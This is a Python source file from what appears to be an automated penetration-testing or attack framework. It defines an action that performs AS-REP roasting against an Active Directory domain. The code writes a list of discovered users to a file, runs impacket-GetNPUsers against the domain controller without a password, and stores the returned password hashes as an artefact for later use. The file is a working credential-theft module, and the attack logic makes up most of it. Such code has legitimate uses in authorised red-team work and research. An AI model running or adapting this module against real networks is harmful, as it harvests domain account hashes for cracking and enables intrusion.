from pathlib import Path
from typing import Any

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from motifs import ActionInputMotif, ActionOutputMotif
from Session import SessionManager


class ImpacketGetNPUsers(Action):
    """
    ActiveDirectoryGetNPUsers action that performs ASREPRoast attack using GetNPUsers.py.
    This action requires:
    - User entities (discovered users to test for ASREPRoast)
    - A ComputerAccount entity with is_domain_controller_account flag set to true and ip_address (provides the DC IP address)
    - A File entity with users list (created by AdalancheFetchUsers)
    """

    def __init__(self):
        super().__init__("ImpacketGetNPUsers", "T1558", "TA0006", [])
        self.noise = 0.3
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for ImpacketGetNPUsers.

        Query for Users entities and their associated ComputerAccounts.

        Returns:
            ActionInputMotif: Input motif requiring DomainPartition and ComputerAccount (controller=True) entities
        """
        input_motif = ActionInputMotif(
            name="InputMotif_ImpacketGetNPUsers",
            description="Input requirements for Impacket GetNPUsers command",
        )
        input_motif.add_template(entity=Entity('DomainPartition', alias='domain'), template_name="existing_domain")
        input_motif.add_template(
            entity=Entity('ComputerAccount', alias='computer', controller=True),
            template_name="existing_account",
            match_on="existing_domain",
            relationship_type="belongs_to",
        )
        input_motif.add_template(
            entity=Entity('User', alias='users'),
            template_name="existing_user",
            match_on="existing_domain",
            relationship_type="belongs_to",
        )
        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif templates for FastNmapScan.

        Defines templates for:
        - Discovered assets (linked to subnet via belongs_to relationship)
        - Open ports (linked to assets via has relationship)

        Returns:
            ActionOutputMotif: Output motif with asset and port templates
        """
        output_motif = ActionOutputMotif(
            name="impacketgetnpusers_output",
            description="Templates for fetched password hashes",
        )

        output_motif.add_template(
            entity=Entity('File', alias='file'),
            template_name="discovered_file",
            match_on=Entity('DomainPartition'),
            relationship_type='has',
            invert_relationship=True,
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return the expected outcome of the ImpacketGetNPUsers action.
        """
        computer_account = pattern.get('computer')
        domain = pattern.get('domain').get('label')
        dc_ip = computer_account.get('ip_address')
        return [
            f"Fetch password hashes for users on domain {domain} via domain controller {dc_ip} and save them to a new asrep_hashes.txt file"
        ]

    def get_target_query(self) -> Query:
        """
        Query for Users entities and their associated ComputerAccounts.
        """
        query = self.input_motif.get_query()
        query.carry('COLLECT(users) AS users, computer, domain')
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute GetNPUsers.py command to perform ASREPRoast attack.
        """
        users = pattern.get('users').get('entities')
        domain = pattern.get('domain')
        computer_account = pattern.get('computer')

        domain_label = domain.get('label')
        dc_ip = computer_account.get('ip_address')

        # Create a temporary users file from the User entities in the knowledge graph
        users_filename = "temp_users.txt"
        users_uuid = artefacts.placeholder(users_filename)
        users_file_path = artefacts.get_path(users_uuid)

        # Write the current user to the file (we'll get all users from the KG in capture_state_change)
        with open(users_file_path, 'w') as f:
            for user in users:
                f.write(f"{user.get('name')}\n")

        # Create output file artefact
        output_filename = "asrep_hashes.txt"
        output_uuid = artefacts.placeholder(output_filename)
        output_path = artefacts.get_path(output_uuid)

        # Construct the GetNPUsers command
        # Format: GetNPUsers.py -no-pass -usersfile users.txt -outputfile asrep_hashes.txt -dc-ip DC_IP domain/
        command_args = [
            "-no-pass",
            "-usersfile",
            str(users_file_path),
            "-outputfile",
            str(output_path),
            "-dc-ip",
            dc_ip,
            f"{domain_label}/",
        ]

        exec_result = shell("impacket-GetNPUsers", command_args)

        if exec_result.exit_status != 0:
            # Check for specific errors
            error_text = (exec_result.stderr or "") + (exec_result.stdout or "")
            if "Connection timed out" in error_text or "Could not connect" in error_text:
                return ActionExecutionResult(
                    command=command_args,
                    stdout=exec_result.stdout,
                    stderr=f"Failed to connect to domain controller {dc_ip}. Check network connectivity.",
                    exit_status=1,
                    logs=[f"ActiveDirectoryGetNPUsers failed to connect to DC {dc_ip}"],
                )
            return exec_result

        # Check for errors in stdout/stderr even if exit_status is 0
        # GetNPUsers.py returns errors in output but doesn't change exit status
        error_indicators = [
            "Error in bindRequest",
            "Error in searchRequest",
            "invalidCredentials",
            "referral:",
            "Connection timed out",
            "[-] Error",
            "[-] [Errno ",
        ]

        output_text = (exec_result.stdout or "") + (exec_result.stderr or "")
        if any(error in output_text for error in error_indicators):
            # Create a failed execution result
            return ActionExecutionResult(
                command=command_args,
                stdout=exec_result.stdout,
                stderr=exec_result.stderr,
                exit_status=1,
                logs=[f"ActiveDirectoryGetNPUsers command failed with error: {output_text}"],
            )

        # Add the output file to artefacts
        exec_result.artefacts["asrep_hashes"] = output_uuid
        return exec_result

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict[str, list[str]]) -> StateChangeSequence:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        self.output_motif.reset_context()
        domain = pattern.get('domain')
        changes: StateChangeSequence = []

        if not discovered_data:
            return changes

        output_path = str(discovered_data.get("output_path"))

        file = self.output_motif.instantiate(
            "discovered_file",
            match_on_override=domain,
            name="asrep_hashes.txt",
            file_type="asrep_hashes",
            location=output_path,
        )
        changes.append(file)

        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from the ActiveDirectoryGetNPUsers execution.
        This could involve parsing the output file and updating the knowledge graph with discovered ASREP hashes.
        """
        changes: StateChangeSequence = []

        # If the command failed, don't process any state changes
        if output.exit_status != 0:
            return changes

        # Get the output file path
        if "asrep_hashes" in output.artefacts:
            output_uuid = output.artefacts["asrep_hashes"]
            output_path = artefacts.get_path(output_uuid)

            # Check if the file was created and has content
            if Path(output_path).exists() and Path(output_path).stat().st_size > 0:
                changes = self.populate_output_motif(pattern, {"output_path": output_path})

        return changes

    def parse_output(self, output: ActionExecutionResult) -> dict[str, Any]:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        return {}
